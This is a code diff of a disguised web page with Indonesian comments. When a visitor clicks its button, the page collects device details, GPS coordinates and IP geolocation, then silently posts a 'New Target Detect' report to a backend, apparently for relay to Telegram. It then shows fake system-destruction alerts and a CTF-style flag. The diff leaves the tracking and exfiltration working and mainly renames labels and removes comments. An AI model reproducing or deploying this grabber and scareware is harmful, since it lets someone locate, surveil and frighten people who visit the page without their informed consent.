@@ -477,7 +477,7 @@
                         <input type="hidden" id="payloadName" value="Target:">
                         <input type="hidden" id="payloadMessage" value="Payload injected successfully via Terminal.">
                         
-                        <button class="exploit-btn" onclick="kirimKeTelegram()">[ INJECT_PAYLOAD ]</button>
+                        <button class="exploit-btn" onclick="kirimKeTelegram()">[ I_HATE_YOU ]</button>
                     </div>
                 <div class="action-bar">
                     <span class="action-item">💬 404 Comments</span>
@@ -595,7 +595,6 @@
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const acc = position.coords.accuracy;
-                        // PERBAIKAN: Memperbaiki format URL Google Maps agar bisa diklik di Telegram
                         mapsUrl = `https://google.com{lat},${lon}`;
                         resolve(`🛰️ GPS Aktif\n├─ Latitude: ${lat}\n├─ Longitude: ${lon}\n└─ Akurasi: ${Math.round(acc)} meter`);
                     },
@@ -607,29 +606,27 @@
             });
         }
 
-        // 3. Susun semua variabel ke dalam teks laporan tunggal
         const teksLaporan = `
-☣️ *GOD_MODE_SYSTEM_EXPLOIT*
+New Target Detect:
 
-📱 *HARDWARE*
+📱 *Hardware*
 ├─ ⚡ *Baterai:* ${batteryInfo}
 ├─ 💾 *RAM:* ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Hidden/iOS'}
 ├─ 🎛️ *CPU Cores:* ${navigator.hardwareConcurrency || 'Unknown'} Core
 ├─ 🎮 *GPU:* \`${gpuInfo}\`
 └─ 🎚️ *Layar:* ${window.screen.width}x${window.screen.height} px
 
-📡 *GPS LOKASI ASLI (MINTA IZIN)*
+📡 *Location*
 ${gpsCoords}
-📍 *Link Google Maps Presisi:* ${mapsUrl}
+📍 *Link Google Maps:* ${mapsUrl}
 
-🌐 *JARINGAN CADANGAN (IPWHO.IS)*
+🌐 *Network (IPWHO.IS)*
 ├─ 🌐 *IP:* ${geoData.ip || 'Unknown'}
 ├─ 🏢 *ISP:* ${geoData.connection?.isp || 'Unknown'}
 ├─ 🌍 *Kota:* ${geoData.city || 'Unknown'}, ${geoData.country || 'Unknown'}
 └─ 🗺️ *Koordinat IP:* ${geoData.latitude || 0}, ${geoData.longitude || 0}
         `.trim();
 
-        // 4. Kirim teks laporan tunggal ke backend Vercel secara silent
         await fetch('/api/kirim.mjs', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -638,14 +635,8 @@ ${gpsCoords}
 
         console.log('Ultimate payload successfully sent.');
 
-        // ========================================================
-        // 🛠️ DI SINI TEMPATNYA! SCRIPT EFEK HOROR BARU DISISIPKAN:
-        // ========================================================
-        
-        // A. Picu layar bergetar hebat dan warna berbalik via CSS
         document.body.classList.add('system-corrupted');
 
-        // B. Daftar teks seram ala sistem error yang akan muncul acak
         const teksSeram = [
             "⚠️ CRITICAL_ERROR: SYSTEM_BYPASS_DETECTED",
             "🚨 WARNING: OVERWRITING_BOOT_SECTOR...",
@@ -655,7 +646,7 @@ ${gpsCoords}
             "🔒 ENCRYPTING_USER_DATA..."
         ];
 
-        // C. Buat looping puluhan kotak merah teks error muncul bertubi-tubi
+        // C. Buat looping puluhan kotak
         let hitung = 0;
         const intervalAlert = setInterval(() => {
             if (hitung < 40) {
@@ -667,16 +658,14 @@ ${gpsCoords}
                 document.body.appendChild(kotak);
                 hitung++;
             } else {
-                // Hentikan looping jika sudah 40 kotak muncul
                 clearInterval(intervalAlert);
-                
-                // D. Nunggu 1,5 detik, bersihkan layar, lalu panggil pop-up kode rahasia final!
+
                 setTimeout(() => {
                     document.body.classList.remove('system-corrupted');
                     document.querySelectorAll('.scary-alert').forEach(el => el.remove());
                     
-                    // Pop-up kode rahasia kamu
-                    alert("you found me, Th1s is the code: FSCTY{Byp4ss_5ucc355}");
+                    // Pop-up kode rahasia
+                    alert("you found me, Th1s is the code: Fscty{y0u_f0und_sc4r3p3r3_#098#}");
                 }, 1500);
             }
         }, 80);
